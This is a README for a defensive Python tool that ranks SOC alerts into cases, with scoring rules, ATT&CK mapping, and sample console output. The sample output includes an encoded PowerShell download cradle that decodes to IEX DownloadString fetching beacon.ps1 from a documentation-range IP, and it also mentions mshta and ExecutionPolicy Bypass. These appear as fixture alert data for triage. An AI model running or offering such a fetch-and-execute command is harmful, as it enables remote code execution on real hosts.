# SOC Alert Triage Engine

<p align="center">
  <img src="https://img.shields.io/badge/Python-3.8%2B-3776AB?style=for-the-badge&logo=python&logoColor=white" alt="Python">
  <img src="https://img.shields.io/badge/Dependencies-zero-2ea44f?style=for-the-badge" alt="Zero dependencies">
  <img src="https://img.shields.io/badge/Focus-SOC%20Operations%20%2F%20SOAR-blue?style=for-the-badge" alt="SOC operations">
  <img src="https://img.shields.io/badge/Mapped%20to-MITRE%20ATT%26CK-red?style=for-the-badge" alt="ATT&CK">
  <img src="https://img.shields.io/badge/Tests-95%20passing-2ea44f?style=for-the-badge" alt="Tests">
  <img src="https://img.shields.io/badge/License-MIT-green?style=for-the-badge" alt="License">
</p>

> **Detection tools produce rows. This produces a work queue.**
>
> It takes a flat list of alerts, works out what each one *touches*, checks those
> indicators against threat intelligence, scores every alert with a breakdown you
> can read line by line, and folds the whole batch into per-account **cases**,
> each one a single decision with an owner, an SLA and a playbook.
>
> 🛡️ **It never acts.** No blocking, no isolation, no changes to any host. A human
> decides; this just makes the decision cheap.

---

## 🎯 The problem: alert fatigue isn't caused by bad detections

It's caused by *good* detections arriving **flat**.

A hundred alerts land in a queue with no ranking, no context and no relationship
to each other. Seven "Low" findings that together describe an intrusion get
triaged — and closed — seven separate times, as Low. Meanwhile the admin whose
legitimate deployment script trips three rules gets investigated first, because
their alerts happened to arrive at the top.

Ranking that queue correctly is a **different job** from finding the alerts in
the first place, and it's the job this tool does:

| The manual step an analyst repeats all day | What this engine does |
|---|---|
| "What does this command actually touch?" | Extracts IPs, domains, URLs and hashes, **including from Base64-encoded payloads** |
| "Is that address known-bad?" | Enriches every indicator against threat intel (or a bundled offline snapshot) |
| "Which box, and where did they come in from?" | Tracks the affected **host** and the **origin address**, and tells destinations from sources |
| "How urgent is this, really?" | Scores 0–100 from severity + intel + context + correlation, and **shows its work** |
| "Wait, have I seen this account already today?" | Folds alerts into cases and detects kill-chain progression |
| "…and has anything else come from that address?" | Correlates by origin as well as by account: spraying, stuffing, reused credentials |
| "So what do I actually do?" | Emits an ATT&CK-tactic playbook, a queue assignment and an SLA |
| "Who needs to know now?" | Posts high-risk cases to Slack / Discord / Teams |

---

## 🔗 How this differs from a detection tool

This is the second stage of a two-stage pipeline. The first stage is
[**Windows Log Threat Hunter**](https://github.com/barisburakturgut/windows-log-threat-hunter),
which reads raw Windows event logs and emits findings. They look superficially
alike (both speak ATT&CK, both emit HTML), but they answer different questions
and are built on different ideas:

|  | **Stage 1 · Threat Hunter** | **Stage 2 · Triage Engine** (this repo) |
|---|---|---|
| Question | *Did anything suspicious happen?* | *Which of these matters first?* |
| Input | Raw event logs (4104 / 4688 / Sysmon 1) | Findings that already exist |
| Output | A list of findings | A ranked queue of cases + recommendations |
| Discipline | Detection engineering | SOC operations / alert triage |
| Core logic | Regex + AND-conditions, per event | Multi-factor scoring + cross-event correlation |
| Scope of reasoning | **One event at a time, stateless** | **The whole batch, stateful per account** |
| External data | none | threat-intelligence providers |

The one-line version: **a detector reasons about an event; a triage engine
reasons about the relationship *between* events.**

That's not a slogan. It's measurable on the bundled sample:

- **`whoami /all`** is `Low` in the detector. Always. Forever. Whoever runs it.
  Here the same three recon findings land at **56/100 Medium**, because the engine
  knows the account that ran them walked *seven ATT&CK tactics in ten minutes*.
  A per-event rule engine cannot know that; it has no memory of the other events.
- **`-ExecutionPolicy Bypass`** is `Medium` in the detector. Here it scores
  **43**, pulled *down* by `−10`, because the only externally-routable address
  in the command line is Google's public DNS resolver, which intel knows as
  benign. The share it writes to, `\\10.20.5.14\deploy$`, is RFC1918 space, so it
  is scoped `internal` and never counts as an external destination; it is listed
  in the indicator table but is not what drives the score (only one intel verdict
  scores per alert, the highest-ranked indicator's). A rule engine has no concept
  of "internal" or of external reputation, so it cannot make that call.

  Write the same share as a DNS name (`\\fileserver.corp.com\deploy$`) and the
  alert still scores **43**, but for a reason worth stating plainly: `.corp.com`
  is in `internal_domain_suffixes` in `config/triage.json`. That is the whole of
  what the engine knows. It has no directory, no DNS and no asset inventory; it
  cannot tell a file server from a lookalike domain. RFC1918 is a fact about the
  address, but "this hostname is ours" is a **statement you make in config**, and
  an unconfigured estate gets the safe answer instead: with the suffix list
  empty, that same command scores **53**, the FQDN being treated as unknown
  internet infrastructure.

- **Three unrelated failed logons** are three separate `Low` rows in the
  detector: one per account, each perfectly ordinary. Here they become a
  **`+20` shared-origin correlation** on all three, because one address touched
  all of them inside thirty minutes. A per-event engine has no axis to see this
  on: it never compares two events to each other at all.

Put precisely: in a detector, **severity is a property of the rule**. Here,
**score is a property of the situation.**

A snapshot of stage 1 sits in [`vendor/`](vendor/windows-log-threat-hunter) so
the launcher can run both halves from one double-click. That is stage 1's code
living here for convenience, not a second detector: nothing in `triage/` reads an
event log, and this engine still cannot see anything a detector did not hand it.

---

## ✨ Features

- **Zero dependencies.** Python 3.8+ standard library only. No `pip install`, ever.
- **Runs offline out of the box**: a bundled intel snapshot means `git clone` → run → full triage. No API key needed.
- **Optional live intel** from AbuseIPDB (IPs) and VirusTotal (domains/hashes) when keys are present, with on-disk caching and rate-limit pauses.
- **Decodes before it judges**, so Base64 `-enc` PowerShell is decoded (UTF-16LE, falling back to UTF-8 for blobs from other tooling) and re-scanned. Indicators found only that way are flagged `via decode`. Bearer tokens and JWTs are skipped, so they cannot invent indicators.
- **Knows direction.** Every indicator carries a role: *destination* (what the host called out to), *source* (where the session came from), *asset* (the affected machine). They score differently, because they mean different things.
- **Explainable scoring**: every alert carries the full list of `+points → reason` that produced its score. No black-box number.
- **Two correlation axes**, by account (one user walking a kill chain) **and** by origin address (one address touching many users). Neither can see what the other sees.
- **Triage-as-code**: every weight, band, threshold and playbook lives in [`config/triage.json`](config/triage.json).
- **Real output.** A case-oriented console queue, a self-contained HTML report, machine-readable JSON, and Slack/Discord/Teams webhooks.
- **Tested** by 95 unit and end-to-end tests on `unittest`, with no test dependencies either.

---

## 🚀 Quickstart

```bash
git clone https://github.com/barisburakturgut/soc-alert-triage.git
cd soc-alert-triage

# 1. Triage the bundled sample findings - offline, no keys, no network
python soc-triage.py

# 2. Same thing, as an HTML report you can attach to a ticket
python soc-triage.py --html reports/triage.html --open

# 3. Triage a real Windows Log Threat Hunter export (the two-stage pipeline)
.\Invoke-ThreatHunt.ps1 -Hours 72 -Json hunt.json     # stage 1, in the other repo
python soc-triage.py -i hunt.json --html reports/triage.html --open

# 4. Use live threat intelligence
$env:ABUSEIPDB_API_KEY = "..."      # PowerShell
python soc-triage.py --intel live

# 5. See exactly what would be posted to chat, without sending it
python soc-triage.py --notify https://hooks.slack.com/services/... --dry-run
```

**On Windows you can also just double-click `SOC Alert Triage.cmd`** and the
report opens in your browser. It will hunt this machine's own event logs and
triage what it finds, or take a findings file you already have, from the usual
Windows dialog. Dropping a `findings.json` onto the launcher skips the menu.

Scanning needs a detector, and a snapshot of [Windows Log Threat
Hunter](https://github.com/barisburakturgut/windows-log-threat-hunter) rides
along in [`vendor/`](vendor/windows-log-threat-hunter) so that works out of the
box. An installed copy wins when there is one, whether that is a clone beside
this folder or `THREAT_HUNTER` pointing at a script; the snapshot is the
fallback, not the preference.

It asks for administrator rights first, because Security 4688 carries the process
command lines and is unreadable without them. Decline and everything still works;
only the scan loses that one source.

---

## 🧠 How it works

```
findings.json
     │
     ├─▶ EXTRACT    IPs · domains · URLs · hashes
     │              └─ Base64 payloads decoded first, then re-scanned
     │
     │              └─ each tagged source / destination / asset
     │
     ├─▶ ENRICH     each indicator → malicious / suspicious / unknown / clean / internal
     │              offline snapshot, or AbuseIPDB + VirusTotal (cached)
     │
     ├─▶ CORRELATE  by account → kill-chain spread · repeats · bursts
     │              by origin  → one address across many accounts (spray / stuffing)
     │
     ├─▶ SCORE      severity + intel + context + correlation → 0-100 + full breakdown
     │              → band → queue + SLA → ATT&CK playbook
     │
     └─▶ REPORT     case queue: console · HTML · JSON · Slack/Discord/Teams
```

Correlation deliberately runs **before** scoring: whether this account's alerts
span five ATT&CK tactics is a fact about the batch, and it has to be available as
a per-alert modifier.

---

## 📊 The scoring model

```
score = severity base
      + worst threat-intel verdict among the alert's indicators
      + context modifiers
      + correlation modifiers
```

| Component | Values |
|---|---|
| **Severity base** | High `+50` · Medium `+30` · Low `+10` |
| **Threat intel** | malicious `+40` · suspicious `+20` · unknown `0` · clean `−10` · internal `−10` |
| **Context** | outside business hours `+10` · non-working day `+8` · privileged account `+15` · service account `+12` · external destination `+8` · **instance metadata endpoint `+15`** · **external origin `+18`** · **internal origin `+10`** |
| **Correlation** | kill-chain spread `+8` per tactic from the third onward (3 tactics `+8`, 4 `+16`, 5+ `+24`) · repeated detection `+10` · alert burst `+12` · **shared origin across accounts `+20`** |

`169.254.169.254`, the cloud instance metadata service, is the one address that
is neither internal nor external. It is unreachable from anywhere but the host
itself and has no reputation to look up, so an "is it known-bad?" model scores it
`0`; but reading it is how a foothold on a cloud instance becomes that
instance's role credentials. It is therefore scored **`+15` as a destination**
and is explicitly excluded from every internal discount. As a *source* it earns
nothing: a link-local origin is an unconfigured NIC, not a place anyone drove a
session from.

The two origin modifiers are where direction earns its keep. A session driven
from **outside the network** is a different event from the same commands typed at
the console. And an **internal** origin that isn't the host's own console is the
shape of lateral movement, so it adds `+10` and is explicitly excluded from the
`−10` that internal *destinations* get. Talking to your own file server is
reassuring; being driven *from* another internal box is not.

Clamped to 0–100, then banded:

| Band | Score | Queue | SLA |
|---|---|---|---|
| 🔴 Critical | 85+ | Tier 2 / Incident Response | 15 min |
| 🟠 High | 65–84 | Tier 2 | 60 min |
| 🟡 Medium | 40–64 | Tier 1 | 4 h |
| 🔵 Low | 20–39 | Tier 1 / batch review | 24 h |
| ⚪ Informational | 0–19 | Auto-close with note | — |

Every one of those numbers is a line in [`config/triage.json`](config/triage.json),
not a constant in the code. Change a weight, re-run, watch the queue re-order.

---

## ⚙️ Things worth knowing before you tune it

- **`internal_domain_suffixes` is how you tell it what "ours" means.** RFC1918
  space is internal by arithmetic; a *hostname* is internal only because you said
  so. Ship your real suffixes and `\\fileserver.corp.com\share` stops looking
  like the internet. Leave the list empty and every FQDN is scoped `external`,
  which is the wrong answer in the safe direction.
- **`shared_origin.min_accounts` is a NAT setting, not a taste setting.** At `2`,
  any two colleagues behind one office gateway look like a password spray. It
  ships at `3`. If your users egress through a handful of addresses, raise it.
- **`risk_bands` may be listed in any order.** Banding sorts by `min_score`, so a
  hand-edited file cannot silently hand out the wrong queue.
- **The config is validated before anything is enriched.** A missing or malformed
  key fails with one sentence and exit `2` (`error: config\triage.json is missing
  "intel_modifiers"`) rather than a traceback halfway through a batch, and
  without spending a single intel lookup first. A findings file whose elements
  are not objects fails the same way, naming the index.
- **The intel cache is namespaced by enrichment mode and expires after 24 h.**
  Offline-snapshot verdicts are *never* written to it, so an offline run creates
  no `.cache/` at all and a fixture verdict can never be served to a later
  `--intel live` run. The report header names which providers actually
  answered: `live: AbuseIPDB (IP), VirusTotal (domain/hash)  [verdicts from: …]`.
  So a run that silently fell back to the snapshot cannot pass for a live one; the
  JSON export carries the answering provider per indicator.
- **`--min-band` is display-only.** It filters what the report shows and nothing
  else: the exit code is decided from the whole batch before any filtering, and
  if the flag hides a case at High or above you get a warning on stderr saying so.

---

## 🔍 Example output

**18 findings become 5 cases.** This is what an analyst picks up:

```
  Critical: 7   High: 3   Medium: 7   Low: 1   Informational: 0
  18 alert(s) folded into 5 case(s).

------------------------------------------------------------------------------
  CASE #1  [100/100] CRITICAL   CORP\jdoe
    queue: Tier 2 / Incident Response   SLA: 15 min   account: standard   alerts: 11
    11 alert(s) on CORP\jdoe, on VPN-GW-01, WKSTN-0412, driven from outside the network via 198.51.100.30, spanning Initial Access -> Execution -> Persistence -> Defense Evasion -> Credential Access -> Discovery -> Command and Control, touching known-bad 203.0.113.233, 7446d75f3dfee276699f5abbdd774098006130e6576ab85fde1d44f58455214e, cdn-update.xyz.
    hosts:  VPN-GW-01, WKSTN-0412
    origin: 198.51.100.30  [EXTERNAL, intel: suspicious]
    chain:  Initial Access -> Execution -> Persistence -> Defense Evasion -> Credential Access -> Discovery -> Command and Control
    ioc:    198.51.100.30  [suspicious]
    ioc:    203.0.113.233  [malicious]
    ioc:    7446d75f3dfee276699f5abbdd774098006130e6576ab85fde1d44f58455214e  [malicious]
    ioc:    cdn-update.xyz  [malicious]
    window: 2026-08-20 03:12:04  ..  2026-08-20 09:48:31

  CASE #2  [ 78/100] HIGH   CORP\mkaya
  CASE #3  [ 78/100] HIGH   CORP\ademir
  CASE #4  [ 60/100] MEDIUM   CORP\svc_backup
  CASE #5  [ 43/100] MEDIUM   CORP\admin_bt
```

Cases #2–#5 print the same block as case #1; only their headers are shown above.
Behind them: **mkaya** was sprayed at 03:12 and then, at 09:50, opened an RDP
session into `SRV-FILE-02` from the internal address `10.20.7.41`: the spray
followed by lateral movement. **ademir** is one lone `Low`. **svc_backup** ran
`mshta` at 02:17, and **admin_bt** is the noisy admin.

Eleven rows became one decision. Expand any alert inside a case and it justifies itself:

```
    ALRT-0005  [100] Critical       Encoded PowerShell command
      2026-08-20T09:41:58   T1059.001 / T1027   log: PS4104
      host:    WKSTN-0412
      cmd:     powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC...
      decoded: IEX (New-Object Net.WebClient).DownloadString('http://203...
       ? destination url     http://203.0.113.233/beacon.ps1  -> unknown  (via decode)
      !! destination ip      203.0.113.233  -> malicious  (via decode)
      why this score:
        + 50  Detection severity: High
        + 40  Threat intel: 203.0.113.233 (destination) = malicious
        +  8  Context: external destination referenced
        + 24  Correlation: 7 ATT&CK tactics on this account
        + 10  Correlation: repeated detection (RECON-BURST x3)
        + 12  Correlation: 10 alerts within 10 minutes
        (raw 144 clamped to 100)
      action:  Recommend containment now: isolate the host and disable the account pending review.
```

*(The tool also prints the one-line rationale for each `+`: "indicator is
known-bad in threat intelligence (recovered only after decoding the payload)"
and so on. They are dropped here for width; nothing else is.)*

The C2 address was **not visible in the command line**; it existed only inside
the Base64 blob. Decode-then-enrich is what turns that into a `+40`.

### The case that proves origin correlation

`CORP\ademir` has **one alert**. It's `Low`. There is no kill chain, no repeat,
no burst. Grouping by account, there is nothing here to see, and this is exactly
the alert a tired analyst closes at 3am:

```
    ALRT-0003  [ 78] High           Repeated failed logons for a single account
      2026-08-20T03:12:41   T1110.003   log: SECURITY
      host:    VPN-GW-01
      from:    198.51.100.30  (external, logon type 3)
       ! source      ip      198.51.100.30  -> suspicious
      why this score:
        + 10  Detection severity: Low
        + 20  Threat intel: 198.51.100.30 (source) = suspicious
        + 10  Context: 03:12 is outside business hours
        + 18  Context: session originated externally from 198.51.100.30
        + 20  Correlation: origin 198.51.100.30 touched 3 accounts within 30 minutes (ademir, jdoe, mkaya)
      action:  Recommend analyst pickup within the SLA and a decision on containment.
```

A single `Low` finding reaches **High**, because the *other two* accounts it
touched are in different cases entirely. Account-grouping is structurally blind
to this: each of the three users shows one unremarkable alert. Pivoting on origin
is what makes a spray visible.

The HTML report ([`reports/demo.html`](reports/demo.html)) renders all of this as
a queue board: a risk dial and ATT&CK stepper per case, affected hosts and origin
addresses called out above the fold, and each alert's indicators tagged
`source` / `destination` / `asset`.

---

## ⚖️ On tuning (and why `unknown` is not `clean`)

The bundled sample is built to make one point: **the noisiest account is not the
incident.**

- **`CORP\admin_bt`: 43, Medium.** Runs `-ExecutionPolicy Bypass` against an
  internal share and Base64-encodes a certificate. Both trip rules. Only one
  intel verdict scores per alert (the highest-ranked indicator drives it), and
  here that is `clean` (8.8.8.8), for `−10`; the internal share is listed in the
  indicator table but adds nothing. The other alert sits at 25 / batch review.
  Noisy, not dangerous.
- **`CORP\svc_backup` lands at 60, Medium.** Runs `mshta` against an *unreviewed*
  external address at 02:17. Nothing is known-bad, so intel adds `0`, but the
  off-hours and service-account modifiers keep it **above** the admin. `unknown`
  earns nothing, ever. *No reputation data* is not *evidence of safety*.
- **`CORP\ademir`: 78, High.** One `Low` failed-logon alert and nothing else.
  Promoted purely by *where it came from*, and by the two other accounts that
  address touched. The tuning lesson cuts both ways: context can rescue an alert
  as well as dismiss one.
- **`CORP\jdoe` reaches 100, Critical.** Walks the full kill chain to a known C2.

Getting those three in that order is the actual job. Re-weighting
`config/triage.json` and re-running is one command, which is the point of
keeping the model out of the code.

---

## 🧪 Tests

```bash
python -m unittest discover -s tests -v
```

95 tests, no dependencies. They cover the things that break quietly: Base64
decoding in both encodings and the `via_decode` flag, `Net.WebClient` **not**
being mistaken for a domain, version strings, shell-script filenames and bearer
tokens **not** being mistaken for indicators, RFC1918 vs. routable classification
(IPv4 and IPv6), link-local and CGNAT space classified as neither, an internal
DNS suffix scoping a hostname, nested and array fields reaching the scanner with
the right role, source/destination/asset roles and the fact that an internal
*source* gets no discount, origin modifiers ordering correctly, shared-origin
correlation firing on three accounts but **not** on one account or on two
different origins, and its label naming only the accounts of the window that
flagged it, the instance-metadata endpoint being scored **up** rather than
discounted, timestamp parsing across every accepted variant (so a findings file
cannot score differently on 3.8 than on 3.12), score-equals-sum-of-its-reasons,
clamping, band boundaries surviving a hand-reordered `risk_bands` array,
per-account correlation isolation, a malformed findings file and a config with a
missing key both failing with one sentence and exit 2, `--min-band` never moving
the exit code, reports still rendering from null and hostile fields with neither
an escape sequence nor a bidi override reaching the terminal, and the full sample
batch both ranking the compromised user above the benign admin *and* promoting
`ademir`'s lone `Low` alert to High.

---

## 🔌 Input format

Any JSON array of objects. Recognised fields:

```json
{
  "Severity": "High",
  "RuleId": "PS-ENCODED",
  "Rule": "Encoded PowerShell command",
  "Attack": "T1059.001 / T1027",
  "Time": "2026-08-20T09:41:58",
  "Source": "PS4104",
  "User": "CORP\\jdoe",
  "CommandLine": "powershell.exe -nop -w hidden -enc SQBFAFgA...",
  "Why": "PowerShell was launched with a Base64-encoded command..."
}
```

This is exactly what `Invoke-ThreatHunt.ps1 -Json` emits, but nothing here is
tied to it; any tool that can write findings as JSON can feed this one.

**Optional fields that unlock the origin features:**

```json
{
  "Host": "VPN-GW-01",
  "SourceIp": "198.51.100.30",
  "LogonType": "3"
}
```

`Host` (also `Hostname` / `Computer` / `ComputerName`) names the affected asset.
`SourceIp` (also `IpAddress` / `ClientIp` / `RemoteIp` / `SourceAddress`) is the
origin. Supply them and you get origin scoring, shared-origin correlation and
per-host case context; omit them and everything else works unchanged.

**What else gets scanned.** Every field the engine does not recognise by name
(`Image`, `ParentImage`, `Hashes`, …) is scanned for indicators, and what it
finds is tagged **destination**. Only the field *names* above change that: the
`SourceIp` family makes an indicator a *source*, the `Host` family makes it an
*asset*. Pure metadata (`Rule`, `Why`, `Severity`, `Time`, `Attack`, `Source`,
`LogonType`) is skipped, because scanning prose only invents indicators.

The value does not have to be a flat string. Objects and arrays are walked up to
four levels deep (`{"CommandLine": {"raw": "..."}}` and
`{"Extra": [{"deep": ["..."]}]}` both reach the scanner), and every string found
inside inherits the **top-level** field's role, so a nested `SourceIp` is still a
source. Numbers, booleans and `null` are stepped over, anything deeper than four
levels is ignored rather than recursed into, and a findings element that is not
an object at all yields nothing instead of raising. So Elastic- or Splunk-shaped
exports work as they arrive; a differently *named* field still needs one line in
the role tables to be read as anything but a destination.

> **Where source IPs actually come from.** Process-execution telemetry
> (PowerShell 4104, Security 4688, Sysmon 1) has **no network fields at all**, so
> a detector built only on those cannot supply an origin. Source addresses live in
> Security **4624 / 4625** (logon, with `IpAddress` and `LogonType`), Sysmon
> **Event 3** (network connection) and Security **5156**. The bundled sample
> includes findings shaped like 4624/4625 to show what the engine does with them;
> teaching stage 1 to collect those events is on its roadmap, not this one's.

---

## 🗺️ Roadmap ideas

- MISP / OpenCTI as an additional intel provider.
- Host-centric cases alongside account-centric ones ("everything that happened on SRV-FILE-02").
- ASN / geo enrichment on origin addresses, and "impossible travel" between logons.
- Per-account behavioural baselining, so "unusual **for this user**" becomes a modifier.
- Suppression rules (approved change windows, known-good automation) as config.
- Export cases as Jira / TheHive tickets.
- Historical scoring: has this indicator been seen in previous batches?

---

## ⚖️ Legal / ethical

Defensive tooling for data from systems **you own or are authorized to analyse**.
The engine reads and scores; it never contains, blocks, isolates or changes
anything. Verdicts are pattern matches and third-party reputation, **not proof of
compromise**. Always verify in context before acting on a recommendation.

Indicators in [`samples/`](samples/README.md) are illustrative fixtures, not live
intelligence. Every external address in them is from an RFC 5737 documentation
range (`192.0.2.0/24`, `198.51.100.0/24`, `203.0.113.0/24`) and the file hashes
are synthetic, so no real host is implicated by an invented verdict. The one real
address is `8.8.8.8`, and its `clean` verdict is the true one.

The `--notify` webhook URL is itself a credential; keep it in `.env`, which is
gitignored. It is never echoed into console output, reports or error messages.

> **Disclaimer.** This software is provided **"AS IS", without warranty of any kind.**
> The author accepts **no responsibility or liability** for any use, misuse, damage,
> data loss, or consequence arising from it. **You use it entirely at your own risk.**

---

## 👤 Author & license

Designed and written by **Baris Burak Turgut**. Copyright © 2026 Baris Burak Turgut.

Released under the **[MIT License](LICENSE)**. You may use, modify and
redistribute this work, including commercially and in closed-source products, so
long as the copyright notice and the licence text travel with it. The licence
carries the standard **no-warranty / no-liability** terms quoted above.
